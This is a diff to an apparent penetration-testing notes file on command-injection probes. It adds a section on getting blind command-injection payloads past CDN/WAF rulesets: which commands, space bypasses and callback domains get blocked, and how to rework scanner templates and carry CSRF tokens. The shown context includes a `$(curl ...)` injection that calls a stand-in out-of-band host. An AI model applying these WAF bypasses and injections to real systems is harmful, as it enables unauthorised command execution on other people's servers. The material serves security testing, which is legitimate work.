@@ -26,6 +26,39 @@ Reusable command-injection probes + filter bypasses. Blind variants need OOB (Co
 $(curl http://<id>.oob.example)
 ```
 
+### CDN/WAF in front: pick the verb and the callback domain deliberately
+
+A managed CDN ruleset (Cloudflare's is the one seen in the wild) blocks blind-cmdi probes
+on **two independent axes**, and both silently kill every stock scanner template - the
+payload dies at the edge and never reaches the origin, so a clean run is **not** evidence
+of absence. Fingerprint both before running anything, against one endpoint with a known
+`200` baseline, one probe at a time:
+
+| axis | typically BLOCKED (403) | typically PASSES |
+|---|---|---|
+| DNS verb + argument | `nslookup <x>`, `curl <x>`, `wget <x>`, `whoami` | `host <x>`, `dig <x>`, `ping -c1 <x>` |
+| space bypass | `${IFS}` / `$IFS$9` | a literal space |
+| callback domain | `oastify.com`, `interact.sh`, `burpcollaborator.net` | `oast.fun` / `oast.me` / `oast.pro` / `oast.site`, `canarytokens.com`, `requestrepo.com`, `webhook.site`, `dnslog.cn`, own domain |
+| separators | (usually none) | `;` `\|` `&` `$()` `` ` `` `%0a` |
+
+Consequences worth internalising:
+
+- **Burp Collaborator can be unusable** on such a target - `oastify.com` is blocklisted by
+  name, with or without a command around it. Switch to interactsh (`.oast.fun`), whose
+  domains commonly pass. Test the bare domain alone to separate the two rules.
+- **Stock nuclei OOB templates are neutered.** `dast/vulnerabilities/cmdi/blind-oast-polyglots.yaml`
+  and most `-tags oast` cmdi payloads are built from `nslookup` / `wget` / `${IFS}`. Clone the
+  template and swap in `host` / `dig` / `ping -c1` with literal spaces. Non-cmdi OOB checks
+  (JNDI/`${jndi:ldap://}`, XXE entities) are unaffected.
+- **Query string and POST body are filtered by DIFFERENT rules.** A body that 403s on
+  `;host <x>` may pass `$(host <x>)`. Always retest the shape per part.
+- A `419` / `422` / `400` is the *app's* CSRF or validation layer, not the sink: the field
+  was never used. Prime the form page, carry its cookies + `_token` / `authenticity_token` /
+  `YII_CSRF_TOKEN`, then re-probe, or the whole POST run measures nothing.
+
+Always prove the channel before trusting a negative: resolve `poscontrol.<your-id>` from
+your own box and confirm the listener logs it. See [[oob-callbacks]].
+
 ## Time-based (blind, no OOB)
 ```
 ; sleep 10
